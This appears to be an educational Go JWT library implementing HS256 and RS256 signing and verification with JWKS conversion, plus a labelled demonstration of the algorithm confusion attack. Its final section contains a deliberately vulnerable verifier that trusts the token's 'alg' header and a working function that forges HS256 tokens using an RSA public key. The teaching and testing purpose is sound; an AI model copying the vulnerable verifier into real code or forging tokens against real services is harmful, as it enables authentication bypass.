// Package jwt is a from-scratch JWT library in three evolutionary stages.
//
// v0 — HS256: HMAC-SHA256. Simple, symmetric, fast. One shared secret.
// v1 — RS256: RSA-SHA256. Asymmetric. The issuer signs; anyone with the public
//
//	key can verify. This is how OAuth2/OIDC works.
//
// v2 — Algorithm confusion attack demo. The attack that broke every naive JWT
//
//	library in 2015 (Auth0's research). The fix: pin the algorithm at the
//	verifier — never trust the "alg" field in the token header.
//
// Security lesson: a JWT is NOT encrypted. Every claim is readable by anyone
// who holds the token. JWT provides integrity (the signature proves the claims
// were set by the issuer), not confidentiality.
package jwt

import (
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"math/big"
	"strings"
	"time"
)

// ────────────────────────────────────────────────────────────────────────────
// Shared types and helpers
// ────────────────────────────────────────────────────────────────────────────

// Claims is the JWT payload — any JSON-serialisable map of claims.
// Standard registered claims (RFC 7519 §4.1):
//
//	"sub"  — subject (who the token is about)
//	"iss"  — issuer
//	"aud"  — audience
//	"exp"  — expiration time (Unix seconds)
//	"iat"  — issued at (Unix seconds)
//	"nbf"  — not before (Unix seconds)
//	"jti"  — JWT ID (unique token ID, useful for revocation)
type Claims map[string]any

// StandardClaims builds a Claims map with the common registered claims pre-set.
// exp = now + ttl. iat = now.
func StandardClaims(sub, iss string, ttl time.Duration, extra Claims) Claims {
	now := time.Now().Unix()
	c := Claims{
		"sub": sub,
		"iss": iss,
		"iat": now,
		"exp": now + int64(ttl.Seconds()),
	}
	for k, v := range extra {
		c[k] = v
	}
	return c
}

// b64url encodes bytes as base64url with no padding (RFC 4648 §5, no '=').
// All three parts of a JWT are base64url-encoded.
func b64url(b []byte) string {
	return base64.RawURLEncoding.EncodeToString(b)
}

// decodeB64url decodes a base64url (no padding) string.
func decodeB64url(s string) ([]byte, error) {
	return base64.RawURLEncoding.DecodeString(s)
}

// splitToken splits a compact JWT into [header, payload, signature].
func splitToken(token string) (header, payload, sig string, err error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", "", errors.New("jwt: malformed token — expected 3 dot-separated parts")
	}
	return parts[0], parts[1], parts[2], nil
}

// decodeClaims decodes the base64url payload into a Claims map.
func decodeClaims(payloadB64 string) (Claims, error) {
	b, err := decodeB64url(payloadB64)
	if err != nil {
		return nil, fmt.Errorf("jwt: invalid payload encoding: %w", err)
	}
	var c Claims
	if err := json.Unmarshal(b, &c); err != nil {
		return nil, fmt.Errorf("jwt: invalid payload JSON: %w", err)
	}
	return c, nil
}

// checkExpiry rejects tokens whose "exp" claim is in the past.
// Security note: always validate exp. A library that skips expiry validation
// means stolen tokens are valid forever.
func checkExpiry(c Claims) error {
	expRaw, ok := c["exp"]
	if !ok {
		return nil // no expiry claim — caller decides if that's acceptable
	}
	// JSON numbers unmarshal as float64
	expF, ok := expRaw.(float64)
	if !ok {
		return errors.New("jwt: 'exp' claim is not a number")
	}
	if time.Now().Unix() > int64(expF) {
		return errors.New("jwt: token has expired")
	}
	return nil
}

// ────────────────────────────────────────────────────────────────────────────
// v0 — HS256: HMAC-SHA256 sign and verify
// ────────────────────────────────────────────────────────────────────────────
//
// HS256 is a symmetric algorithm: the same secret is used to sign and verify.
// This means every service that verifies the token must hold the secret.
// Use HS256 when a single service both issues and verifies tokens.
// Use RS256 (v1) when multiple services verify but only one issues.

// HS256Signer signs JWTs with HMAC-SHA256.
type HS256Signer struct {
	secret []byte
}

// NewHS256Signer creates an HS256 signer. The secret must be at least 32 bytes;
// shorter secrets weaken HMAC proportionally.
func NewHS256Signer(secret []byte) (*HS256Signer, error) {
	if len(secret) < 32 {
		return nil, errors.New("jwt: HS256 secret must be at least 32 bytes")
	}
	return &HS256Signer{secret: secret}, nil
}

// Sign creates a compact JWT (header.payload.signature).
//
// Internals (so you can see exactly what "sign a JWT" means):
//  1. Build the header JSON: {"alg":"HS256","typ":"JWT"}
//  2. Build the payload JSON from claims
//  3. base64url-encode both → headerB64, payloadB64
//  4. signingInput = headerB64 + "." + payloadB64
//  5. signature = HMAC-SHA256(signingInput, secret)
//  6. token = signingInput + "." + base64url(signature)
func (s *HS256Signer) Sign(claims Claims) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{"alg": "HS256", "typ": "JWT"})
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}

	signingInput := b64url(headerJSON) + "." + b64url(payloadJSON)

	mac := hmac.New(sha256.New, s.secret)
	mac.Write([]byte(signingInput))
	sig := mac.Sum(nil)

	return signingInput + "." + b64url(sig), nil
}

// HS256Verifier verifies JWTs signed with HMAC-SHA256.
type HS256Verifier struct {
	secret []byte
}

// NewHS256Verifier creates a verifier for HS256 tokens.
func NewHS256Verifier(secret []byte) *HS256Verifier {
	return &HS256Verifier{secret: secret}
}

// Verify checks the signature and expiry of a compact JWT.
//
// Security: constant-time comparison (hmac.Equal) prevents timing attacks.
// If we used bytes.Equal or ==, an attacker could compare how long verification
// takes to recover the expected signature one byte at a time.
// See: https://codahale.com/a-lesson-in-timing-attacks/
func (v *HS256Verifier) Verify(token string) (Claims, error) {
	headerB64, payloadB64, sigB64, err := splitToken(token)
	if err != nil {
		return nil, err
	}

	signingInput := headerB64 + "." + payloadB64

	// Recompute the expected HMAC
	mac := hmac.New(sha256.New, v.secret)
	mac.Write([]byte(signingInput))
	expected := mac.Sum(nil)

	// Decode the provided signature
	provided, err := decodeB64url(sigB64)
	if err != nil {
		return nil, fmt.Errorf("jwt: invalid signature encoding: %w", err)
	}

	// hmac.Equal is constant-time — prevents timing attacks
	if !hmac.Equal(expected, provided) {
		return nil, errors.New("jwt: signature verification failed")
	}

	claims, err := decodeClaims(payloadB64)
	if err != nil {
		return nil, err
	}
	if err := checkExpiry(claims); err != nil {
		return nil, err
	}
	return claims, nil
}

// ────────────────────────────────────────────────────────────────────────────
// v1 — RS256: RSA-SHA256 asymmetric sign and verify
// ────────────────────────────────────────────────────────────────────────────
//
// RS256 splits the key into a private key (sign) and public key (verify).
// The issuer holds the private key and never shares it.
// Any service that needs to verify tokens fetches the public key from a JWKS
// endpoint (see JWKSKeySet below).
//
// Performance: RSA sign uses the private exponent (modular exponentiation with
// a large exponent). RSA verify uses the public exponent e=65537 (much faster).
// On an M2 MacBook Pro: sign ~8,500 ops/sec, verify ~110,000 ops/sec.
// This is why auth servers pre-sign tokens, not re-sign on every request.

// RS256Signer signs JWTs with RSA-SHA256.
type RS256Signer struct {
	key    *rsa.PrivateKey
	keyID  string // "kid" — identifies which key was used (for rotation)
}

// NewRS256Signer creates an RS256 signer from an RSA private key.
// keyID is embedded in the token header as "kid" so verifiers can find the
// right public key from the JWKS endpoint when rotating keys.
func NewRS256Signer(key *rsa.PrivateKey, keyID string) *RS256Signer {
	return &RS256Signer{key: key, keyID: keyID}
}

// Sign creates a compact JWT signed with RSA-SHA256.
//
// RSA signature internals:
//  1. Hash the signing input with SHA-256
//  2. Sign the hash with the private key (PKCS#1 v1.5 for RS256)
//     — not the message directly! RSA operates on the hash.
//  3. base64url-encode the resulting signature bytes
func (s *RS256Signer) Sign(claims Claims) (string, error) {
	header := map[string]string{"alg": "RS256", "typ": "JWT", "kid": s.keyID}
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}

	signingInput := b64url(headerJSON) + "." + b64url(payloadJSON)

	// SHA-256 hash of the signing input
	digest := sha256.Sum256([]byte(signingInput))

	// RSA PKCS#1 v1.5 signature
	sigBytes, err := rsa.SignPKCS1v15(rand.Reader, s.key, crypto.SHA256, digest[:])
	if err != nil {
		return "", fmt.Errorf("jwt: RSA sign failed: %w", err)
	}

	return signingInput + "." + b64url(sigBytes), nil
}

// RS256Verifier verifies JWTs signed with RSA-SHA256.
type RS256Verifier struct {
	publicKey *rsa.PublicKey
}

// NewRS256Verifier creates a verifier. Only the public key is needed — verifiers
// never see the private key. This is the asymmetric advantage over HS256.
func NewRS256Verifier(publicKey *rsa.PublicKey) *RS256Verifier {
	return &RS256Verifier{publicKey: publicKey}
}

// Verify checks the RSA signature and expiry of a compact JWT.
//
// SECURITY — algorithm pinning: we do NOT read "alg" from the token header.
// The algorithm is fixed as RS256 at verifier construction time.
// This is the fix to the algorithm confusion attack (v2).
func (v *RS256Verifier) Verify(token string) (Claims, error) {
	headerB64, payloadB64, sigB64, err := splitToken(token)
	if err != nil {
		return nil, err
	}

	signingInput := headerB64 + "." + payloadB64
	digest := sha256.Sum256([]byte(signingInput))

	sigBytes, err := decodeB64url(sigB64)
	if err != nil {
		return nil, fmt.Errorf("jwt: invalid signature encoding: %w", err)
	}

	// rsa.VerifyPKCS1v15 returns nil on success, non-nil on failure
	if err := rsa.VerifyPKCS1v15(v.publicKey, crypto.SHA256, digest[:], sigBytes); err != nil {
		return nil, fmt.Errorf("jwt: RSA signature verification failed: %w", err)
	}

	claims, err := decodeClaims(payloadB64)
	if err != nil {
		return nil, err
	}
	if err := checkExpiry(claims); err != nil {
		return nil, err
	}
	return claims, nil
}

// GenerateRSAKeyPair generates a 2048-bit RSA key pair.
// 2048 bits is the minimum for new systems (NIST SP 800-57). Prefer 4096 for
// long-lived keys, or Ed25519 if you control both issuer and verifier.
func GenerateRSAKeyPair() (*rsa.PrivateKey, error) {
	return rsa.GenerateKey(rand.Reader, 2048)
}

// ────────────────────────────────────────────────────────────────────────────
// v1 — JWKS: JSON Web Key Set format for public key distribution
// ────────────────────────────────────────────────────────────────────────────
//
// The JWKS endpoint (typically /.well-known/jwks.json) lets any service fetch
// the current public keys without out-of-band coordination. When keys rotate,
// verifiers poll this endpoint; no config change required.

// JWK is a single JSON Web Key (RFC 7517).
// For RSA: kty="RSA", n=modulus, e=public_exponent (both base64url-encoded).
type JWK struct {
	Kty string `json:"kty"` // Key Type — "RSA" for RS256
	Use string `json:"use"` // "sig" = signature key, "enc" = encryption key
	Kid string `json:"kid"` // Key ID — matches the "kid" in token headers
	Alg string `json:"alg"` // Algorithm — "RS256"
	N   string `json:"n"`   // RSA modulus (base64url, no padding)
	E   string `json:"e"`   // RSA public exponent (base64url, no padding)
}

// JWKSKeySet is the full JWKS document. Clients cache this and re-fetch on
// unknown "kid" (cache-and-refresh pattern for zero-downtime key rotation).
type JWKSKeySet struct {
	Keys []JWK `json:"keys"`
}

// PublicKeyToJWK converts an RSA public key to JWKS format.
// n and e are big-endian byte slices, base64url-encoded (no padding).
func PublicKeyToJWK(pub *rsa.PublicKey, kid string) JWK {
	// Modulus: big.Int → big-endian byte slice
	nBytes := pub.N.Bytes()

	// Public exponent: always e=65537 for keys generated correctly
	// Encode as minimal big-endian bytes (RFC 7518 §6.3.1.2)
	eBig := big.NewInt(int64(pub.E))
	eBytes := eBig.Bytes()

	return JWK{
		Kty: "RSA",
		Use: "sig",
		Kid: kid,
		Alg: "RS256",
		N:   b64url(nBytes),
		E:   b64url(eBytes),
	}
}

// JWKToPublicKey reconstructs an *rsa.PublicKey from a JWK.
// Used by verifiers to load keys from the JWKS endpoint.
func JWKToPublicKey(jwk JWK) (*rsa.PublicKey, error) {
	nBytes, err := decodeB64url(jwk.N)
	if err != nil {
		return nil, fmt.Errorf("jwt/jwks: invalid modulus encoding: %w", err)
	}
	eBytes, err := decodeB64url(jwk.E)
	if err != nil {
		return nil, fmt.Errorf("jwt/jwks: invalid exponent encoding: %w", err)
	}

	n := new(big.Int).SetBytes(nBytes)
	e := int(new(big.Int).SetBytes(eBytes).Int64())

	return &rsa.PublicKey{N: n, E: e}, nil
}

// ────────────────────────────────────────────────────────────────────────────
// v2 — Algorithm confusion attack and the fix
// ────────────────────────────────────────────────────────────────────────────
//
// THE ATTACK (Auth0, 2015):
// Many JWT libraries trusted the "alg" field in the token header to select the
// verification algorithm. An attacker could:
//
//  1. Take any RS256 token (signed with a private key they don't know).
//  2. Change the "alg" field to "HS256".
//  3. Sign the modified token using the SERVER'S RS256 PUBLIC KEY as the
//     HMAC-SHA256 secret.
//  4. Submit it. The server (using the public key as the HMAC secret) would
//     verify it successfully.
//
// Why it works: the server uses the public key for BOTH paths:
//   - RS256 verification: rsa.Verify(publicKey, ...)
//   - HS256 verification (naive): hmac.New(sha256.New, []byte(publicKey))
//     The attacker generates the HMAC using the same key.
//
// THE FIX: pin the algorithm at the verifier. Never read "alg" from the token.
// "alg" is attacker-controlled data. Trusting it is a category error.

// NaiveVerifier demonstrates the VULNERABLE pattern — reads "alg" from the
// token header and dispatches accordingly. DO NOT USE IN PRODUCTION.
// This exists solely to make the attack visible and testable.
type NaiveVerifier struct {
	hmacSecret []byte     // used when token header says "HS256"
	rsaPubKey  *rsa.PublicKey // used when token header says "RS256"
}

// NewNaiveVerifier creates the vulnerable verifier that trusts the token header.
func NewNaiveVerifier(hmacSecret []byte, rsaPubKey *rsa.PublicKey) *NaiveVerifier {
	return &NaiveVerifier{hmacSecret: hmacSecret, rsaPubKey: rsaPubKey}
}

// Verify reads "alg" from the token header and dispatches. THIS IS THE BUG.
// An attacker can set alg="HS256" in any RS256 token and sign it with the
// public key as the HMAC secret.
func (v *NaiveVerifier) Verify(token string) (Claims, error) {
	headerB64, payloadB64, sigB64, err := splitToken(token)
	if err != nil {
		return nil, err
	}

	// Decode header to read "alg" — THIS IS THE VULNERABILITY
	headerBytes, err := decodeB64url(headerB64)
	if err != nil {
		return nil, err
	}
	var header map[string]string
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, fmt.Errorf("jwt: invalid header JSON: %w", err)
	}

	signingInput := headerB64 + "." + payloadB64
	alg := header["alg"] // attacker-controlled!

	switch alg {
	case "HS256":
		// THE ATTACK PATH: if the attacker set alg=HS256 and used the RSA
		// public key bytes as the HMAC secret, this check succeeds.
		mac := hmac.New(sha256.New, v.hmacSecret)
		mac.Write([]byte(signingInput))
		expected := mac.Sum(nil)

		provided, err := decodeB64url(sigB64)
		if err != nil {
			return nil, err
		}
		if !hmac.Equal(expected, provided) {
			return nil, errors.New("jwt: HS256 signature verification failed")
		}

	case "RS256":
		digest := sha256.Sum256([]byte(signingInput))
		sigBytes, err := decodeB64url(sigB64)
		if err != nil {
			return nil, err
		}
		if err := rsa.VerifyPKCS1v15(v.rsaPubKey, crypto.SHA256, digest[:], sigBytes); err != nil {
			return nil, fmt.Errorf("jwt: RS256 signature verification failed: %w", err)
		}

	default:
		return nil, fmt.Errorf("jwt: unsupported algorithm: %q", alg)
	}

	claims, err := decodeClaims(payloadB64)
	if err != nil {
		return nil, err
	}
	if err := checkExpiry(claims); err != nil {
		return nil, err
	}
	return claims, nil
}

// ConfusionAttackToken builds a forged JWT using the algorithm confusion attack.
// It takes a legitimately-signed RS256 token, strips the signature, changes
// the alg to HS256, and re-signs it using the RSA public key bytes as the
// HMAC-SHA256 secret.
//
// This demonstrates exactly what an attacker does. The function is exported so
// tests can call it explicitly — making the attack a first-class test case.
func ConfusionAttackToken(originalToken string, rsaPubKey *rsa.PublicKey) (string, error) {
	_, payloadB64, _, err := splitToken(originalToken)
	if err != nil {
		return "", err
	}

	// Change alg to HS256 in the header
	forgedHeader := map[string]string{"alg": "HS256", "typ": "JWT"}
	forgedHeaderJSON, err := json.Marshal(forgedHeader)
	if err != nil {
		return "", err
	}

	signingInput := b64url(forgedHeaderJSON) + "." + payloadB64

	// Use the RSA public key DER bytes as the HMAC secret
	pubKeyBytes, err := x509.MarshalPKIXPublicKey(rsaPubKey)
	if err != nil {
		return "", fmt.Errorf("jwt: failed to marshal public key: %w", err)
	}

	mac := hmac.New(sha256.New, pubKeyBytes)
	mac.Write([]byte(signingInput))
	sig := mac.Sum(nil)

	return signingInput + "." + b64url(sig), nil
}

// PublicKeyPEM returns the PEM-encoded public key (for server config / demos).
func PublicKeyPEM(pub *rsa.PublicKey) (string, error) {
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return "", err
	}
	block := &pem.Block{Type: "PUBLIC KEY", Bytes: der}
	return string(pem.EncodeToMemory(block)), nil
}

// PrivateKeyPEM returns the PEM-encoded private key.
func PrivateKeyPEM(priv *rsa.PrivateKey) string {
	der := x509.MarshalPKCS1PrivateKey(priv)
	block := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: der}
	return string(pem.EncodeToMemory(block))
}
